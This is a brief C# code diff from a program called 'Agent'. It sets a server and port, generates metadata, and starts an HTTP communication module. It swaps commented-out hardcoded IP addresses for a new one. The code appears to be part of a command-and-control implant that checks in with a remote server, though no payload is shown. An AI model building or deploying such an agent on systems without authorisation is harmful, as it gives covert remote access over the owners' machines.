@@ -29,12 +29,12 @@ namespace Agent
                 port = Convert.ToInt32(split[1]);
             }
 
+            //server = "13.38.61.75";
+            //port = 80;
+
             GenerateMetadata();
 
             s_commModule = new HttpCommModule(server, port);
-            //s_commModule = new HttpCommModule("192.168.56.102", 8080);
-            //s_commModule = new HttpCommModule("15.188.8.236", 80);
-
 
             var agent = new Models.Agent(s_metadata, s_commModule);
             agent.Start();
